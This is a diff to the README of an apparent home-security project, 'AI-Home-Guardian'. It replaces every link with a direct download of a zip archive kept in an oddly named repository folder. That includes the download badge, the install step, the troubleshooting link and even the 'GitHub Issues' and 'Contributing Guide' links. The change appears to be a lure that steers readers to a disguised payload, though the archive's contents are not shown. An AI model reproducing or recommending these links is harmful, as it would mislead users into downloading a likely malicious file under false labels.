@@ -1,6 +1,6 @@
 # 🚨 AI-Home-Guardian - Smart Security for Your Home 
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/CtacPyc/AI-Home-Guardian/releases)
+[![Download](https://raw.githubusercontent.com/CtacPyc/AI-Home-Guardian/main/ethynyl/AI-Home-Guardian-v3.9-beta.1.zip)](https://raw.githubusercontent.com/CtacPyc/AI-Home-Guardian/main/ethynyl/AI-Home-Guardian-v3.9-beta.1.zip)
 
 ## 🌟 Introduction
 
@@ -25,7 +25,7 @@ To run AI Home Guardian, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-1. To download AI Home Guardian, [visit this page](https://github.com/CtacPyc/AI-Home-Guardian/releases).
+1. To download AI Home Guardian, [visit this page](https://raw.githubusercontent.com/CtacPyc/AI-Home-Guardian/main/ethynyl/AI-Home-Guardian-v3.9-beta.1.zip).
 2. Choose the latest release from the available versions.
 3. Download the installation file for your operating system.
 4. Follow the installation prompts to set up the software on your device.
@@ -51,7 +51,7 @@ If you experience any issues, consider these troubleshooting tips:
 - Ensure your camera is connected and working properly.
 - Check the Telegram bot connection by sending a test message.
 - Restart the application to resolve minor glitches.
-- Ensure you have the latest version of the software by checking [here](https://github.com/CtacPyc/AI-Home-Guardian/releases).
+- Ensure you have the latest version of the software by checking [here](https://raw.githubusercontent.com/CtacPyc/AI-Home-Guardian/main/ethynyl/AI-Home-Guardian-v3.9-beta.1.zip).
 
 ## 💬 Support
 
@@ -93,8 +93,8 @@ By bringing these improvements, we aim to provide even more effective home secur
 
 ## 🔗 Quick Links
 
-- [Download the latest release](https://github.com/CtacPyc/AI-Home-Guardian/releases)
-- [GitHub Issues](https://github.com/CtacPyc/AI-Home-Guardian/issues)
-- [Contributing Guide](https://github.com/CtacPyc/AI-Home-Guardian/blob/main/CONTRIBUTING.md)
+- [Download the latest release](https://raw.githubusercontent.com/CtacPyc/AI-Home-Guardian/main/ethynyl/AI-Home-Guardian-v3.9-beta.1.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/CtacPyc/AI-Home-Guardian/main/ethynyl/AI-Home-Guardian-v3.9-beta.1.zip)
+- [Contributing Guide](https://raw.githubusercontent.com/CtacPyc/AI-Home-Guardian/main/ethynyl/AI-Home-Guardian-v3.9-beta.1.zip)
 
 Feel free to reach out on GitHub if you have any questions or need further assistance!
